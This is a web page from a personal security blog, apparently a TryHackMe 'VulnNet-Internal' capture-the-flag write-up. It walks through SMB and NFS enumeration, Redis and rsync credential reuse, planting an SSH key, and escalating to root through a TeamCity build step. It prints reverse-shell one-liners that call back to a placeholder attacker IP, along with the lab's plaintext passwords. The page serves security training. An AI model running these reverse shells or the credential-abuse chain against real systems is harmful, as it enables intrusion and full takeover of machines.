@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulnNet-Internal | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-7xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-VulnNet-Internal</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">VulnNet-Internal</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<pre class="codehilite"><code>PORT     STATE    SERVICE     VERSION
+22/tcp   open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 2f:10:41:14:39:01:0c:81:c5:d3:43:7c:c0:4b:4c:13 (RSA)
+|   256 ad:b8:17:ab:bd:7e:cf:db:2f:d0:16:6e:68:2e:47:ec (ECDSA)
+|_  256 2f:f2:04:69:2a:8f:96:c6:56:10:44:f6:69:a4:19:f2 (ED25519)
+111/tcp  open     rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      33356/udp   mountd
+|   100005  1,2,3      43485/tcp6  mountd
+|   100005  1,2,3      44067/tcp   mountd
+|   100005  1,2,3      46331/udp6  mountd
+|   100021  1,3,4      34703/udp6  nlockmgr
+|   100021  1,3,4      39801/udp   nlockmgr
+|   100021  1,3,4      42509/tcp6  nlockmgr
+|   100021  1,3,4      43909/tcp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp  open     netbios-ssn Samba smbd 4
+445/tcp  open     netbios-ssn Samba smbd 4
+873/tcp  open     rsync       (protocol version 31)
+2049/tcp open     nfs         3-4 (RPC #100003)
+9090/tcp filtered zeus-admin
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: , NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: 1s
+| smb2-time: 
+|   date: 2026-01-05T00:37:46
+|_  start_date: N/A
+</code></pre>
+
+<pre class="codehilite"><code>└─$ smbclient -L //10.67.135.105/ -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        shares          Disk      VulnNet Business Shares
+        IPC$            IPC       IPC Service (ip-10-67-135-105 server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.
+Protocol negotiation to server 10.67.135.105 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+Unable to connect with SMB1 -- no workgroup available
+
+└─$ smbclient  //10.67.135.105/shares 
+Password for [WORKGROUP\kali]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Feb  2 04:20:09 2021
+  ..                                  D        0  Tue Feb  2 04:28:11 2021
+  temp                                D        0  Sat Feb  6 06:45:10 2021
+  data                                D        0  Tue Feb  2 04:27:33 2021
+
+                15376180 blocks of size 1024. 2022764 blocks available
+
+smb: \&gt; cd temp
+smb: \temp\&gt; ls
+  .                                   D        0  Sat Feb  6 06:45:10 2021
+  ..                                  D        0  Tue Feb  2 04:20:09 2021
+  services.txt                        N       38  Sat Feb  6 06:45:09 2021
+
+                15376180 blocks of size 1024. 2022764 blocks available
+smb: \temp\&gt; get services.txt
+getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \temp\&gt; cd ..
+smb: \&gt; cd data
+smb: \data\&gt; ls
+  .                                   D        0  Tue Feb  2 04:27:33 2021
+  ..                                  D        0  Tue Feb  2 04:20:09 2021
+  data.txt                            N       48  Tue Feb  2 04:21:18 2021
+  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021
+
+                15376180 blocks of size 1024. 2022764 blocks available
+smb: \data\&gt; get data.txt
+getting file \data\data.txt of size 48 as data.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \data\&gt; get business-req.txt
+getting file \data\business-req.txt of size 190 as business-req.txt (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ ls
+business-req.txt  data.txt  services.txt
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ cat business-req.txt 
+We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
+If you have any questions, please text or phone us.
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ cat services.txt 
+THM{0a09d51e4..........866a497440a}
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ cat data.txt 
+Purge regularly data that is not needed anymore
+</code></pre>
+
+<pre class="codehilite"><code>└─$ showmount -e 10.67.135.105
+Export list for 10.67.135.105:
+/opt/conf *
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ sudo mkdir /mnt/nfs                                     
+[sudo] password for kali: 
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ sudo mount -t nfs 10.67.135.105:/opt/conf /mnt/nfs 
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ cd /mnt/nfs
+
+┌──(kali㉿kali)-[/mnt/nfs]
+└─$ ls
+hp  init  opt  profile.d  redis  vim  wildmidi
+
+┌──(kali㉿kali)-[/mnt/nfs]
+└─$ cd redis 
+
+┌──(kali㉿kali)-[/mnt/nfs/redis]
+└─$ ls
+redis.conf
+</code></pre>
+
+<pre class="codehilite"><code>└─$ redis-cli -h 10.67.135.105
+10.67.135.105:6379&gt; ls
+(error) ERR unknown command `ls`, with args beginning with: 
+(3.15s)
+10.67.135.105:6379&gt; AUTH B65Hx562F@ggAZ@F
+OK
+(0.51s)
+10.67.135.105:6379&gt; keys *
+1) &quot;tmp&quot;
+2) &quot;marketlist&quot;
+3) &quot;authlist&quot;
+4) &quot;internal flag&quot;
+5) &quot;int&quot;
+10.67.135.105:6379&gt; LRANGE authlist 0 -1
+6) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+7) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+8) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+9) &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==&quot;
+10.67.135.105:6379&gt; get internal flag
+(error) ERR wrong number of arguments for 'get' command
+10.67.135.105:6379&gt; get &quot;internal flag&quot;
+</code></pre>
+
+<pre class="codehilite"><code>└─$ echo &quot;QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg&quot; | base64 -d
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+
+
+└─$ rsync --list-only rsync://rsync-connect@10.67.135.105/files
+Password: 
+drwxr-xr-x          4,096 2026/01/04 19:34:18 .
+drwxr-xr-x          4,096 2025/06/28 12:16:36 ssm-user
+drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
+drwxr-xr-x          4,096 2026/01/04 19:34:19 ubuntu
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ rsync --list-only rsync://rsync-connect@10.67.135.105/files/sys-internal/
+Password: 
+drwxr-xr-x          4,096 2021/02/06 07:49:29 .
+-rw-------             61 2021/02/06 07:49:28 .Xauthority
+lrwxrwxrwx              9 2021/02/01 08:33:19 .bash_history
+-rw-r--r--            220 2021/02/01 07:51:14 .bash_logout
+-rw-r--r--          3,771 2021/02/01 07:51:14 .bashrc
+-rw-r--r--             26 2021/02/01 07:53:18 .dmrc
+-rw-r--r--            807 2021/02/01 07:51:14 .profile
+lrwxrwxrwx              9 2021/02/02 09:12:29 .rediscli_history
+-rw-r--r--              0 2021/02/01 07:54:03 .sudo_as_admin_successful
+-rw-r--r--             14 2018/02/12 14:09:01 .xscreensaver
+-rw-------          2,546 2021/02/06 07:49:35 .xsession-errors
+-rw-------          2,546 2021/02/06 06:40:13 .xsession-errors.old
+-rw-------             38 2021/02/06 06:54:25 user.txt
+drwxrwxr-x          4,096 2021/02/02 04:23:00 .cache
+drwxrwxr-x          4,096 2021/02/01 07:53:57 .config
+drwx------          4,096 2021/02/01 07:53:19 .dbus
+drwx------          4,096 2021/02/01 07:53:18 .gnupg
+drwxrwxr-x          4,096 2021/02/01 07:53:22 .local
+drwx------          4,096 2021/02/01 08:37:15 .mozilla
+drwxrwxr-x          4,096 2021/02/06 06:43:14 .ssh
+drwx------          4,096 2021/02/02 06:16:16 .thumbnails
+drwx------          4,096 2021/02/01 07:53:21 Desktop
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Documents
+drwxr-xr-x          4,096 2021/02/01 08:46:46 Downloads
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Music
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Pictures
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Public
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ rsync -av rsync://rsync-connect@10.67.135.105/files/sys-internal/user.txt .
+Password: 
+receiving incremental file list
+user.txt
+
+sent 43 bytes  received 134 bytes  2.88 bytes/sec
+total size is 38  speedup is 0.21
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ cat user.txt                           
+</code></pre>
+
+<pre class="codehilite"><code>└─$ ssh-keygen -f ./id_rsa                                  
+Generating public/private ed25519 key pair.
+Enter passphrase for &quot;./id_rsa&quot; (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in ./id_rsa
+Your public key has been saved in ./id_rsa.pub
+The key fingerprint is:
+SHA256:MONh6GTLFZxu1ulYYD+zzLm9i1F3Diu7u2+1PH9Bv9A kali@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|     ...         |
+|     .=.         |
+|    +oB+ .       |
+|   = =+=B      . |
+|    +o.*S=. o + .|
+|      . *. . *.E.|
+|        .o. .oo.o|
+|        .o.o. +..|
+|        . BO.  oo|
++----[SHA256]-----+
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ ls
+business-req.txt  data.txt  id_rsa  id_rsa.pub  services.txt  user.txt
+</code></pre>
+
+<pre class="codehilite"><code>└─$ chmod 600 id_rsa
+
+┌──(kali㉿kali)-[~/tryhackme/vulnnetinternal]
+└─$ ssh -i id_rsa sys-internal@10.67.135.105
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+
+sys-internal@ip-10-67-135-105:~$ ls
+</code></pre>
+
+<p>Port forward to get wtomcat</p>
+<pre class="codehilite"><code>ssh -i id_ed25519 sys-internal@10.10.52.162 -L 8111:127.0.0.1:8111
+</code></pre>
+
+<p>🛠️ Phase 3: TeamCity (Tomcat) to Root Privilege Escalation<br />
+1. The Discovery</p>
+<p>Through internal enumeration (ss -tulpn), we discovered a service listening on Localhost (127.0.0.1) Port 8111. Using a process check (ps aux), we confirmed this was a TeamCity server (which runs on a Java/Tomcat stack) and, crucially, it was being executed by the root user.<br />
+2. Port Forwarding (Pivoting)</p>
+<p>Because the service was bound to 127.0.0.1, it wasn't accessible from our Kali machine directly. We used SSH Tunneling to forward the port:<br />
+Bash</p>
+<p>ssh -L 8111:127.0.0.1:8111 sys-internal@10.67.138.81</p>
+<p>This allowed us to access the TeamCity web interface at http://localhost:8111 on our local browser.<br />
+3. Authentication &amp; Access</p>
+<p>We gained access to the administration panel. In this scenario, we hunted for credentials in internal configuration files (found in /opt/conf/redis/redis.conf) or logs, identifying the password: B65Hx562F@ggAZ@F.<br />
+4. Code Execution via Build Agent</p>
+<p>TeamCity is designed to run code (builds). By creating a Manual Project and a Build Configuration, we gained the ability to define Build Steps.</p>
+<pre class="codehilite"><code>Runner Type: Command Line
+
+Run: Custom Script
+
+Payload: ```bash #!/bin/bash bash -i &gt;&amp; /dev/tcp/YOUR_KALI_IP/4444 0&gt;&amp;1
+
+*Note: The `#!/bin/bash` header was critical to avoid the &quot;Bad fd number&quot; error caused by the default shell (`/bin/sh`) not supporting the `&gt;&amp;` redirection syntax.*
+</code></pre>
+
+<pre class="codehilite"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;attack_IP&gt; &lt;PORT&gt; &gt;/tmp/f
+</code></pre>
+
+<ol>
+<li>Capturing the Flag</li>
+</ol>
+<p>When the build was triggered, the TeamCity Build Agent executed the script. Since the agent process was owned by root, the reverse shell returned to our Kali listener (nc -lvnp 4444) was a Root Shell.<br />
+Bash</p>
+<p>whoami</p>
+<h1>root</h1>
+<p>cat /root/root.txt</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
